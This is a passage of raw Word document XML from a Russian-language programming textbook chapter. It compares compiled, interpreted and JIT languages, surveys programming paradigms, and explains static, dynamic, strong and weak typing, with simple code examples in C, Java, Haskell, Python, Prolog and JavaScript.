        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Переносимость: байт-код работает на любой платформе с JVM/CLR (Write Once, Run Anywhere).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость: JIT оптимизирует код на основе профиля выполнения (знает, какие ветки кода выполняются чаще).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Безопасность: VM изолирует код (песочница).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленнее чистой компиляции (на старте, пока JIT не прогрелся).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требует VM (JVM жрёт 50-100 MB памяти на запуск).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JavaScript (V8):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Современные движки JavaScript (V8 в Chrome, SpiderMonkey в Firefox) используют JIT. Код сначала интерпретируется, затем горячие участки компилируются в машинный код. Поэтому JavaScript в 2025 году летает (хотя 10 лет назад был тормозом).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сравнение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Тип             | Примеры             | Скорость | Переносимость | Старт программы |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----------------|---------------------|----------|---------------|-----------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Компилируемые   | C, C++, Rust        | ⚡⚡⚡⚡   | ❌ (нужна перекомпиляция) | Мгновенный      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Интерпретируемые| Python, Ruby        | ⚡⚡      | ✅ (кроссплатформенные)   | Мгновенный      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Байт-код + JIT  | Java, C#, JavaScript| ⚡⚡⚡     | ✅ (VM кроссплатформенная)| Задержка прогрева|</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1.3. Классификация по парадигмам программирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Парадигма</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это стиль программирования, способ мышления о коде.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Императивное (процедурное) программирование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> код — это последовательность инструкций, которые изменяют состояние программы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (поиск максимума в массиве, C):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int max = arr[0];</w:t>
        <w:br/>
        <w:t>for (int i = 1; i &lt; n; i++) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (arr[i] &gt; max) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        max = arr[i];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Языки:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> C, Pascal, Fortran, Basic.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> просто, понятно, близко к железу.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> большие программы превращаются в спагетти-код.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Объектно-ориентированное программирование (ООП)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> программа — это набор объектов, которые взаимодействуют друг с другом. Объект = данные (поля) + методы (функции).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные концепции:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Инкапсуляция:** скрытие данных (private/public).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Наследование:** класс может наследовать поля и методы другого класса.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Полиморфизм:** один интерфейс, разные реализации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Java):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>class Dog {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    String name;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    void bark() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        System.out.println(name + " says: Woof!");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>Dog myDog = new Dog();</w:t>
        <w:br/>
        <w:t>myDog.name = "Rex";</w:t>
        <w:br/>
        <w:t>myDog.bark();  // Rex says: Woof!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Языки:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Java, C++, Python, C#, Ruby, Swift, Kotlin.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> модульность, переиспользование кода (наследование), масштабируемость.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> может привести к переусложнению (классы ради классов), медленнее процедурного кода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Критика ООП:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>В 2000-х ООП был мейнстримом. Сейчас многие программисты говорят: "ООП — это не серебряная пуля". Иногда функциональный подход проще и элегантнее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Функциональное программирование (ФП)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> программа — это композиция функций. Нет изменяемого состояния, функции — это чистые математические функции (один и тот же вход → один и тот же выход).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные концепции:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Чистые функции (Pure Functions):** нет побочных эффектов (не изменяют глобальные переменные, не пишут в файлы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Неизменяемость (Immutability):** данные не изменяются после создания.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Функции высшего порядка:** функции, принимающие функции как аргументы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Haskell, поиск максимума):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>maximum [1, 5, 3, 9, 2]  -- результат: 9</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Python, функции высшего порядка):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>numbers = [1, 2, 3, 4, 5]</w:t>
        <w:br/>
        <w:t>squared = list(map(lambda x: x**2, numbers))  # [1, 4, 9, 16, 25]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Языки:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Haskell, Lisp, Scheme, Erlang, F#, Scala.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Мультипарадигменные:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Python, JavaScript, Kotlin.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Код легче тестировать (чистые функции — предсказуемые).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Меньше багов (нет изменяемого состояния = нет race conditions).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Параллелизм (чистые функции легко распараллеливаются).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кривая обучения (нужно переучить мозг).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не интуитивно для новичков.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Иногда медленнее (много копирований данных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример задачи:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> фильтрация списка.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Императивный подход (C):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int result[MAX];</w:t>
        <w:br/>
        <w:t>int j = 0;</w:t>
        <w:br/>
        <w:t>for (int i = 0; i &lt; n; i++) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (arr[i] % 2 == 0) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        result[j++] = arr[i];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Функциональный подход (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>result = [x for x in arr if x % 2 == 0]  # list comprehension</w:t>
        <w:br/>
        <w:t># или:</w:t>
        <w:br/>
        <w:t>result = list(filter(lambda x: x % 2 == 0, arr))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Короче, понятнее, меньше багов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Логическое программирование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> программа — это набор правил (фактов и логических утверждений). Ты описываешь задачу, а система находит решение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Prolog, семейное дерево):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>parent(tom, bob).</w:t>
        <w:br/>
        <w:t>parent(tom, liz).</w:t>
        <w:br/>
        <w:t>parent(bob, ann).</w:t>
        <w:br/>
        <w:br/>
        <w:t>grandparent(X, Y) :- parent(X, Z), parent(Z, Y).</w:t>
        <w:br/>
        <w:br/>
        <w:t>?- grandparent(tom, ann).  % запрос: Том дедушка Анны?</w:t>
        <w:br/>
        <w:t>Yes.  % ответ системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Языки:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Prolog, Datalog.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> экспертные системы, искусственный интеллект, обработка естественного языка.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> элегантное решение логических задач.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> узкоспециализирован, малопопулярен (вне академии почти не используется).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Мультипарадигменные языки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Большинство современных языков поддерживают несколько парадигм.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Python:** императивный + ООП + функциональный.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**JavaScript:** императивный + ООП (прототипы) + функциональный.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**C++:** императивный + ООП + функциональный (с C++11, лямбды).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Scala:** ООП + функциональный.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему это удобно?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выбираешь подход под задачу. Обработка данных — функции. Моделирование сущностей — ООП. Критичный участок — императивный код.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1.4. Классификация по типизации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типизация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это правила, определяющие, когда и как проверяются типы данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Статическая типизация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Типы переменных проверяются </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>на этапе компиляции</w:t>
      </w:r>
      <w:r>
        <w:t>. Если ты пытаешься сложить строку и число — компилятор ругается.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (C++):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int x = 5;</w:t>
        <w:br/>
        <w:t>x = "hello";  // ошибка компиляции: нельзя присвоить строку int</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Языки:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> C, C++, Java, Rust, Go, Swift, Kotlin.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Меньше багов (ошибки типов находятся до запуска).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Производительность (компилятор знает типы, оптимизирует).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Автодополнение в IDE (IDE знает типы всех переменных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Больше церемоний (нужно объявлять типы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленнее прототипирование.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Динамическая типизация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Типы проверяются </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>во время выполнения</w:t>
      </w:r>
      <w:r>
        <w:t>. Переменная может менять тип.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>x = 5       # x — int</w:t>
        <w:br/>
        <w:t>x = "hello" # x теперь str</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Языки:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Python, JavaScript, PHP, Ruby, Lua.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость разработки (меньше кода).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Гибкость (можешь передавать любые типы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ошибки находятся в runtime (запустил программу, она упала).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленнее (проверка типов на лету).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хуже автодополнение (IDE не всегда знает типы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример проблемы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def add(a, b):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return a + b</w:t>
        <w:br/>
        <w:br/>
        <w:t>add(5, 3)       # 8</w:t>
        <w:br/>
        <w:t>add("hello", 5) # TypeError в runtime</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Компилятор не предупредит. Узнаешь об ошибке только при запуске.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Сильная vs слабая типизация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сильная типизация:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> язык строго следит за типами, неявные преобразования минимальны.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>"5" + 3  # TypeError: cannot concatenate str and int</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Слабая типизация:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> язык разрешает неявные преобразования типов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (JavaScript):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>"5" + 3   // "53" (строка + число = строка)</w:t>
        <w:br/>
        <w:t>"5" - 3   // 2 (строка - число = число)</w:t>
        <w:br/>
        <w:t>true + 1  // 2 (true = 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Это источник багов. JavaScript печально известен своими приколами:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
